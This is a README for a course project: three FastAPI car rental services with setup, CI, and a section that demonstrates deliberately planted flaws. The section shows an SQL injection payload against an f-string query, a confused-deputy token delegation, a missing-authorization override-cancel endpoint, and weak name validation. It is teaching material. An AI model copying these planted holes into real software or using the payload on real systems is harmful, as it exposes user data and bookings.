# Secure Car Rental System

Secure-SDLC course project with three FastAPI services:

- Rental API: login, bookings, and requests to the other services.
- Fleet resource service: vehicles, bookings, and SQLite storage.
- Agreement processor: invoice generation through an external renderer.

Each service runs in its own process and verifies JWTs. Only fleet opens the
database. User tokens expire after 15 minutes.

## Install

Requires Python 3.12+. Run commands in PowerShell from the repository root.

```powershell
python -m venv .venv
.\.venv\Scripts\python.exe -m pip install --no-deps -r requirements.txt
.\.venv\Scripts\python.exe -m pip install --no-deps --no-build-isolation --check-build-dependencies -e . -e .\external\rental_invoice_render
.\.venv\Scripts\python.exe -m pip check
```

The pinned [requirements](requirements.txt) include dependencies and build tools.
`--no-deps` limits installation to that list; the checks catch missing or
incompatible packages. The root package contains all three services; the
[renderer](external/rental_invoice_render/pyproject.toml) installs separately.

## Seed and run fleet

Generate one shared JWT key for all three services:

```powershell
.\.venv\Scripts\python.exe -c "import secrets; print(secrets.token_urlsafe(32))"
```

Keep the key outside the repository and use it at each service's prompt.
It must be at least 32 UTF-8 bytes.

```powershell
$env:JWT_SECRET = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Shared JWT secret: '))"
$env:FLEET_DB_PATH = Join-Path (Get-Location) "runtime\fleet.sqlite3"
.\.venv\Scripts\python.exe -m app.fleet_resource_service.db
.\.venv\Scripts\python.exe -m uvicorn app.fleet_resource_service.main:app --host 127.0.0.1 --port 8001
```

Startup creates the schema without seeding. The seed command adds five vehicles
with fixed IDs, leaving existing IDs unchanged. `FLEET_DB_PATH` defaults to
`runtime\fleet.sqlite3`. Bookings and invoices persist across restarts.

## Run the rental API

In a second terminal, enter the same JWT key and three demo passwords
(8-1024 characters). The prompts hide input and keep it out of command history.

```powershell
$env:JWT_SECRET = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Shared JWT secret: '))"
$env:ALICE_PASSWORD = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Alice password: '))"
$env:BOB_PASSWORD = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Bob password: '))"
$env:CAROL_PASSWORD = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Carol password: '))"
$env:FLEET_SERVICE_URL = "http://127.0.0.1:8001"
$env:AGREEMENT_SERVICE_URL = "http://127.0.0.1:8002"
```

The URLs shown are the defaults. All services reject a missing or short JWT key;
the rental API also requires valid demo passwords. Alice and Bob are renters;
Carol is staff. Accounts are recreated at startup, with salted PBKDF2 password
hashes held in memory rather than SQLite.

```powershell
.\.venv\Scripts\python.exe -m uvicorn app.rental_api.main:app --host 127.0.0.1 --port 8000
```

## Run the agreement processor

In a third terminal:

```powershell
$env:JWT_SECRET = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Shared JWT secret: '))"
$env:FLEET_SERVICE_URL = "http://127.0.0.1:8001"
.\.venv\Scripts\python.exe -m uvicorn app.agreement_processor.main:app --host 127.0.0.1 --port 8002
```

The processor needs no passwords or database path. Its only domain route,
`POST /agreements/{booking_id}`, accepts booking-scoped agreement tokens,
not normal user tokens.

OpenAPI documents:

- Rental API: <http://127.0.0.1:8000/openapi.json>
- Fleet resource service: <http://127.0.0.1:8001/openapi.json>
- Agreement processor: <http://127.0.0.1:8002/openapi.json>

Stop each service with Ctrl+C.

## Login and book through the rental API

Rental API and fleet domain routes require a bearer JWT.
See the [access-control matrix](docs/access-control-matrix.md) for permissions.
Log in from a client terminal:

```powershell
$password = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('Alice password: '))"
$credentials = @{ username = "alice"; password = $password } | ConvertTo-Json
$login = Invoke-RestMethod -Method Post -Uri http://127.0.0.1:8000/login -ContentType "application/json" -Body $credentials
$headers = @{ Authorization = "Bearer $($login.access_token)" }
Invoke-RestMethod -Uri http://127.0.0.1:8000/vehicles -Headers $headers
$body = @{ vehicle_id = 1; start_date = "2030-06-01"; end_date = "2030-06-03" } | ConvertTo-Json
$booking = Invoke-RestMethod -Method Post -Uri http://127.0.0.1:8000/bookings -Headers $headers -ContentType "application/json" -Body $body
Invoke-RestMethod -Uri "http://127.0.0.1:8000/bookings/$($booking.id)" -Headers $headers
```

### Generate and retrieve the agreement

With all three services running, continue from the previous example:

```powershell
$agreementUri = "http://127.0.0.1:8000/bookings/$($booking.id)/agreement"
$generated = Invoke-RestMethod -Method Post -Uri $agreementUri -Headers $headers
$saved = Invoke-RestMethod -Uri $agreementUri -Headers $headers
$saved.content
```

Generation follows rental API -> processor -> fleet fetch -> renderer -> fleet
save. Retrieval goes directly from the API to fleet. The processor receives a
booking-scoped token, not the user's token. Both calls return `booking_id` and
the same stored `content`.

To cancel the booking as its owner:

```powershell
Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:8000/bookings/$($booking.id)/cancel" -Headers $headers
```

- Bookings start as `pending`; ownership comes from the JWT, not the request.
- Return dates are exclusive. Overlapping pending bookings return 409, including
  concurrent requests. Cancellation frees the dates.
- Prices are stored in integer cents and do not change with later vehicle rates.
- Carol can manage vehicles and view or cancel any booking.
- Only `scope="agreement"` tokens tied to a `booking_id` can fetch that booking
  and write its invoice. They cannot list bookings, access vehicles, cancel
  bookings, or retrieve invoices.
- The API preserves downstream status codes. Unreachable services return 502;
  timeouts return 504.

## Test the vulnerabilities manually

Start all three services as above. Run these steps in order in one client
terminal. They add vehicles and a booking to your configured database; each run
creates fresh records, so existing bookings won't cause date conflicts.

### Log in

Enter the passwords used when starting the rental API:

```powershell
$api = "http://127.0.0.1:8000"
$fleet = "http://127.0.0.1:8001"
$auth = @{}
foreach ($user in "alice", "bob", "carol") {
    $password = .\.venv\Scripts\python.exe -c "from getpass import getpass; print(getpass('$user password: '))"
    $credentials = @{ username = $user; password = $password } | ConvertTo-Json
    $login = Invoke-RestMethod -Method Post -Uri "$api/login" -ContentType "application/json" -Body $credentials
    $auth[$user] = @{ Authorization = "Bearer $($login.access_token)" }
}
```

Tokens last 15 minutes. Repeat login if a request returns 401.

### 1. Vehicle validation (CWE-20)

As Carol, create a vehicle whose name is three spaces, then read it from fleet:

```powershell
$body = @{ name = "   "; daily_rate_cents = 35000 } | ConvertTo-Json
$invalidVehicle = Invoke-RestMethod -Method Post -Uri "$api/vehicles" -Headers $auth.carol -ContentType "application/json" -Body $body
$vehicles = Invoke-RestMethod -Uri "$fleet/vehicles" -Headers $auth.carol
$vehicles | Where-Object id -eq $invalidVehicle.id | ConvertTo-Json
```

Expected: creation succeeds (201), and the saved vehicle has `"name": "   "`.
Names pass the 1-100 character length check without trimming. An empty string
still returns 422; renters still cannot create vehicles.

`PUT /vehicles/{id}` is removed from both services. Creation, listing, search,
deletion, and invoice-saving PUT remain.

### 2. SQL injection (CWE-89)

Search for a random name, then append a condition that matches every row:

```powershell
$name = "no-such-vehicle-$([guid]::NewGuid().ToString('N'))"
$plain = [uri]::EscapeDataString($name)
$injected = [uri]::EscapeDataString("$name%' OR 1=1 --")
$noMatch = Invoke-RestMethod -Uri "$api/vehicles/search?name=$plain" -Headers $auth.bob
$matches = Invoke-RestMethod -Uri "$api/vehicles/search?name=$injected" -Headers $auth.bob
$all = Invoke-RestMethod -Uri "$api/vehicles" -Headers $auth.bob
"Normal search: $($noMatch.Count); injected search: $($matches.Count); all vehicles: $($all.Count)"
```

Expected: the normal search returns 0 vehicles; the injected search returns
every vehicle, matching the last count. Fleet inserts the search text into SQL
with an f-string instead of a parameterized query. This payload only reads data.
To check fleet directly, repeat with `$fleet` instead of `$api`.

Bandit reports this as `B608`; the finding is not suppressed and is expected to
fail the security gate.

### 3. Confused deputy (CWE-441)

Create a valid vehicle as Carol and book it as Alice:

```powershell
$body = @{ name = "Manual demo"; daily_rate_cents = 35000 } | ConvertTo-Json
$demoVehicle = Invoke-RestMethod -Method Post -Uri "$api/vehicles" -Headers $auth.carol -ContentType "application/json" -Body $body
$body = @{ vehicle_id = $demoVehicle.id; start_date = "2030-06-01"; end_date = "2030-06-03" } | ConvertTo-Json
$demoBooking = Invoke-RestMethod -Method Post -Uri "$api/bookings" -Headers $auth.alice -ContentType "application/json" -Body $body
$bookingUrl = "$api/bookings/$($demoBooking.id)"
```

As Bob, try reading Alice's booking directly, then request its agreement:

```powershell
curl.exe -sS -i -H "Authorization: $($auth.bob.Authorization)" "$fleet/bookings/$($demoBooking.id)"
$leaked = Invoke-RestMethod -Method Post -Uri "$bookingUrl/agreement" -Headers $auth.bob
$leaked.content
$saved = Invoke-RestMethod -Uri "$bookingUrl/agreement" -Headers $auth.alice
$saved.content -ceq $leaked.content
```

Expected: the direct read returns 403, but agreement generation succeeds (200).
The invoice contains `renter_id: alice`, and the final comparison prints `True`.
The API delegates a token with `sub="rental-api"` and `role="staff"` regardless
of Bob's role. Expiry and booking scope still apply.

### 4. Missing authorization (CWE-862 / IDOR)

Keep the same booking. As Bob, try normal cancellation, then the override:

```powershell
curl.exe -sS -i -X POST -H "Authorization: $($auth.bob.Authorization)" "$bookingUrl/cancel"
$cancelled = Invoke-RestMethod -Method Post -Uri "$bookingUrl/override-cancel" -Headers $auth.bob
$cancelled.status
(Invoke-RestMethod -Uri $bookingUrl -Headers $auth.alice).status
```

Expected: normal cancellation returns 403. The override succeeds (200), and both
status lines print `cancelled`, confirming Alice's booking was changed.
The override checks authentication but not role or ownership. Both services
expose it; agreement-scoped tokens are rejected.

## External renderer

`rental_invoice_render.render_invoice(invoice, output_path)` takes a dictionary
and a `pathlib.Path`, writes a UTF-8 invoice, and returns the path.

The processor imports the installed package and chooses a temporary `invoice.txt`
path. It reads the output with a size limit, removes the file, and saves the text
through fleet. SQLite holds the saved copy.

Invalid upstream booking data returns 502. Rendering or filesystem errors and
empty or oversized output return 500 without saving. Cancellation before
write-back returns 409.

## Validation

```powershell
.\.venv\Scripts\python.exe -m pip check
.\.venv\Scripts\python.exe -m ruff check .
.\.venv\Scripts\python.exe -m bandit -r app
.\.venv\Scripts\python.exe -m pip_audit --progress-spinner off
.\.venv\Scripts\python.exe -m pytest -q tests\test_functional.py tests\test_authz.py
```

Tests seed a temporary SQLite database and start three service processes with
generated credentials on local ports. No manual setup is needed; existing
runtime data is untouched, and cleanup stops only the test processes.

The [functional suite](tests/test_functional.py) covers seeding, agreements,
staff operations, pricing, availability, concurrent booking conflicts, and the
validation and SQL injection flaws. The [authorization suite](tests/test_authz.py)
covers permissions and includes `test_least_privilege`,
`test_complete_mediation`, and `test_fail_safe_defaults`.

## CI

The [workflow](.github/workflows/ci.yml) runs on pushes and pull requests with
Python 3.14.9, pinned actions, and read-only repository permissions.

- Build: package installation, `pip check`, Ruff, Bandit, and pip-audit.
  pip-audit blocks all known findings.
- Test: functional and authorization suites with temporary SQLite.
- Artifacts: `build-reports` contains `bandit.json` and `pip-audit.json`;
  `pytest-results` contains `pytest.xml` and `pytest.txt`. Uploads run even
  when checks fail.

See [Actions](https://github.com/Tedas1/SoftwareSecurityA1/actions/workflows/ci.yml)
for run results and artifacts.

## Documentation

- [Lifecycle plan](docs/lifecycle-plan.md).
- [Access-control matrix](docs/access-control-matrix.md).
- [STRIDE analysis](docs/stride-analysis.md).
- [Threat model, asset register and trust boundaries](docs/threat-model.md).

Remaining: Step 7 requirements, CI verification, and the 2,000-2,500-word report
with commit, test, and log references. The project owner writes the AI-use
declaration.